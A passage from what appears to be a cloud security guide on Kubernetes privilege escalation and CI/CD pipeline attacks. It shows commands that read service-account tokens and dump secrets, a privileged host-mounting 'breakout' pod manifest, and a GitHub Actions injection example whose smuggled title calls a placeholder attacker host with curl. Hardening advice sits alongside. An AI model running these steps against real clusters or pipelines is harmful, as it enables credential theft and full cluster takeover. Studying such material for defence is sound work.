+<h2 id="6-kubernetes-privilege-escalation">6. Kubernetes Privilege Escalation<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#6-kubernetes-privilege-escalation" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="61-service-account-tokens">6.1 Service Account Tokens<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#61-service-account-tokens" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Default older clusters mounted SA tokens in every pod:</p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">ls</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /var/run/secrets/kubernetes.io/serviceaccount/</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">cat</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /var/run/secrets/kubernetes.io/serviceaccount/token</span></span>
+<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="normal">CACERT</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">/var/run/secrets/kubernetes.io/serviceaccount/ca.crt</span></span>
+<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="normal">NS</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">$(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">cat</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /var/run/secrets/kubernetes.io/serviceaccount/namespace</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">)</span></span>
+<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="normal">TOKEN</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">$(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">cat</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /var/run/secrets/kubernetes.io/serviceaccount/token</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">)</span></span>
+<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="normal">APISERVER</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">https://kubernetes.default.svc</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -s</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --cacert</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="normal"> $CACERT </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value">-H</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> &quot;Authorization: Bearer </span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="normal">$TOKEN</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="normal"> $APISERVER</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">/api/v1/namespaces/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="normal">$NS</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">/pods</span></span></code></pre></figure>
+<h3 id="62-permission-discovery">6.2 Permission Discovery<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#62-permission-discovery" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">kubectl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> auth</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> can-i</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --list</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">kubectl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> auth</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> can-i</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> create</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> pods</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --as=system:serviceaccount:ns:sa</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">kubectl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> get</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> roles,rolebindings,clusterroles,clusterrolebindings</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -A</span></span></code></pre></figure>
+<h3 id="63-dangerous-rbac-permissions">6.3 Dangerous RBAC Permissions<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#63-dangerous-rbac-permissions" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Verb / resource</th><th>Risk</th></tr></thead><tbody><tr><td><code>create</code> pods</td><td>Mount hostPath, privileged pod → node</td></tr><tr><td><code>create</code> / <code>patch</code> deployments</td><td>Same</td></tr><tr><td><code>get/list/watch</code> secrets</td><td>Creds across ns</td></tr><tr><td><code>escalate</code> / <code>bind</code> roles</td><td>Self-grant admin</td></tr><tr><td><code>impersonate</code></td><td>Become cluster-admin</td></tr><tr><td><code>create</code> node / <code>pods/exec</code></td><td>Lateral</td></tr><tr><td><code>create</code> persistentvolumes</td><td>Host path tricks</td></tr><tr><td>wildcard <code>*</code></td><td>Cluster admin</td></tr></tbody></table></div>
+<h3 id="64-privileged-pod--node">6.4 Privileged Pod → Node<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#64-privileged-pod--node" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>If you can create a pod:</p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="yaml" data-theme="github-light github-dark"><code data-language="yaml" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;" data-token-type="tag">apiVersion</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">v1</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;" data-token-type="tag">kind</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">Pod</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;" data-token-type="tag">metadata</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">:</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;" data-token-type="tag">  name</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">breakout</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;" data-token-type="tag">spec</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">:</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;" data-token-type="tag">  hostNetwork</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value">true</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;" data-token-type="tag">  hostPID</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value">true</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;" data-token-type="tag">  containers</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">:</span></span>
+<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">  - </span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;" data-token-type="tag">name</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">c</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;" data-token-type="tag">    image</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">alpine</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;" data-token-type="tag">    securityContext</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">:</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;" data-token-type="tag">      privileged</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value">true</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;" data-token-type="tag">    volumeMounts</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">:</span></span>
+<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">    - </span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;" data-token-type="tag">name</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">host</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;" data-token-type="tag">      mountPath</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">/host</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;" data-token-type="tag">    command</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">: [</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">&quot;sleep&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">&quot;infinity&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">]</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;" data-token-type="tag">  volumes</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">:</span></span>
+<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">  - </span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;" data-token-type="tag">name</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">host</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;" data-token-type="tag">    hostPath</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">:</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;" data-token-type="tag">      path</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">/</span></span></code></pre></figure>
+<p>Then <code>kubectl exec</code> and <code>chroot /host</code>.</p>
+<h3 id="65-podexec-into-privileged-workloads">6.5 pod/exec into Privileged Workloads<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#65-podexec-into-privileged-workloads" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Compromise of low pod → exec into already privileged daemonset (e.g., monitoring) if RBAC allows.</p>
+<h3 id="66-etcd--api-server-exposure">6.6 etcd / API Server Exposure<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#66-etcd--api-server-exposure" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Mis-exposed etcd or anonymous API access → full cluster compromise.</p>
+<h3 id="67-secrets--configmaps">6.7 Secrets &amp; ConfigMaps<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#67-secrets--configmaps" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">kubectl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> get</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> secrets</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -A</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">kubectl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> get</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> secret</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> NAME</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -o</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> yaml</span></span>
+<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># base64 -d</span></span></code></pre></figure>
+<h3 id="68-cloud-provider-iam-via-nodes">6.8 Cloud Provider IAM via Nodes<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#68-cloud-provider-iam-via-nodes" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Node instance profiles / identities often over-privileged. Escape to node → metadata → cloud admin path (combine with §2–4).</p>
+<h3 id="69-tools">6.9 Tools<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#69-tools" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li><strong>Peirates</strong> — K8s post-exploitation</li>
+<li><strong>kubectl-who-can</strong> / <strong>rakkess</strong></li>
+<li><strong>Kubescape</strong> — misconfig scanning</li>
+<li><strong>KubiScan</strong> — risky RoleBindings</li>
+<li><strong>kube-hunter</strong> / <strong>kube-bench</strong></li>
+<li><strong>BloodHound-like</strong> mappings via custom collectors</li>
+</ul>
+<hr/>
+<h2 id="7-cicd-pipeline-attacks">7. CI/CD Pipeline Attacks<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#7-cicd-pipeline-attacks" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="71-why-cicd-is-a-privilege-nexus">7.1 Why CI/CD Is a Privilege Nexus<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#71-why-cicd-is-a-privilege-nexus" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Pipelines often hold:</p>
+<ul>
+<li>Cloud access keys</li>
+<li>Kubernetes kubeconfigs</li>
+<li>Docker registry creds</li>
+<li>SSH deploy keys</li>
+<li>Signing keys</li>
+<li>Production database URLs</li>
+</ul>
+<p>Compromise of CI = compromise of many environments.</p>
+<h3 id="72-github-actions">7.2 GitHub Actions<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#72-github-actions" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p><strong>Attack surfaces:</strong></p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Issue</th><th>Abuse</th></tr></thead><tbody><tr><td><code>pull_request_target</code> misuse</td><td>Malicious PR runs with secrets</td></tr><tr><td>Self-hosted runners</td><td>Run arbitrary jobs as runner OS user; often privileged network</td></tr><tr><td>Overly broad <code>GITHUB_TOKEN</code> permissions</td><td>Push to main, create releases</td></tr><tr><td>Untrusted workflow inputs</td><td>Script injection in <code>run:</code> steps</td></tr><tr><td>Third-party actions <code>@main</code></td><td>Supply chain tag move</td></tr><tr><td>OIDC role too open</td><td>Cloud role assumption from any repo</td></tr></tbody></table></div>
+<p><strong>Script injection example pattern:</strong></p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="yaml" data-theme="github-light github-dark"><code data-language="yaml" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># Dangerous</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;" data-token-type="tag">run</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">echo ${{ github.event.issue.title }}</span></span>
+<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># Attacker title: `&quot;; curl attacker; #`</span></span></code></pre></figure>
+<p><strong>Self-hosted runner:</strong></p>
+<ul>
+<li>Job can steal tokens from memory/disk</li>
+<li>May Docker-sock mount</li>
+<li>May have cloud metadata access</li>
+</ul>
+<p><strong>Hardening:</strong> least privilege tokens, pinned action SHAs, no secrets on fork PRs, ephemeral runners, OIDC with tight <code>sub</code> claims.</p>
+<h3 id="73-jenkins">7.3 Jenkins<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#73-jenkins" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Issue</th><th>Abuse</th></tr></thead><tbody><tr><td>Script Console / Groovy</td><td>RCE as Jenkins user</td></tr><tr><td>Build agents with labels</td><td>Run on sensitive nodes</td></tr><tr><td>Credentials plugin store</td><td>Decrypt with master key if filesystem access</td></tr><tr><td>Anonymous read + job build</td><td>Trigger malicious pipeline</td></tr><tr><td><code>@Grab</code> / unsafe pipeline libs</td><td>Code exec</td></tr></tbody></table></div>
+<p>Post-ex:</p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="groovy" data-theme="github-light github-dark"><code data-language="groovy" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment">// Historical patterns for dumping credentials — use only in authorized labs</span></span></code></pre></figure>
+<p>Escape to cloud via stored AWS keys; to K8s via kubeconfig credentials.</p>
+<h3 id="74-gitlab-ci">7.4 GitLab CI<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#74-gitlab-ci" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Issue</th><th>Abuse</th></tr></thead><tbody><tr><td>Privileged runners / Docker-in-Docker</td><td>Container escape</td></tr><tr><td><code>CI_JOB_TOKEN</code> abuse</td><td>Cross-project access if weak</td></tr><tr><td>Protected branch misconfig</td><td>Secrets exposure</td></tr><tr><td>Shared runners multi-tenant leak</td><td>Cross-job residual files</td></tr><tr><td>Malicious <code>.gitlab-ci.yml</code> on unprotected branches</td><td>Secret exfil if available</td></tr></tbody></table></div>
+<h3 id="75-general-cicd-privesc-flow">7.5 General CI/CD Privesc Flow<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#75-general-cicd-privesc-flow" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="text" data-theme="github-light github-dark"><code data-language="text" data-theme="github-light github-dark" style="display:grid;"><span data-line><span>Compromise app repo / weak PR controls</span></span>
+<span data-line><span>        → malicious pipeline</span></span>
+<span data-line><span>        → steal cloud OIDC/role or long-lived keys</span></span>
+<span data-line><span>        → cloud admin / cluster-admin</span></span>
+<span data-line><span>        → production data</span></span></code></pre></figure>
+<p>Or:</p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="text" data-theme="github-light github-dark"><code data-language="text" data-theme="github-light github-dark" style="display:grid;"><span data-line><span>Compromise runner OS</span></span>
+<span data-line><span>        → read job environment secrets</span></span>
+<span data-line><span>        → push trojaned artifact to registry</span></span>
+<span data-line><span>        → supply chain to prod</span></span></code></pre></figure>
+<h3 id="76-supply-chain-notes">7.6 Supply Chain Notes<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#76-supply-chain-notes" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li>Poisoned base images</li>
+<li>Dependency confusion</li>
+<li>Malicious build cache</li>
+<li>Unsigned artifacts promoted to prod</li>
+</ul>
+<hr/>
+<h2 id="8-cross-cutting-patterns">8. Cross-Cutting Patterns<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#8-cross-cutting-patterns" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
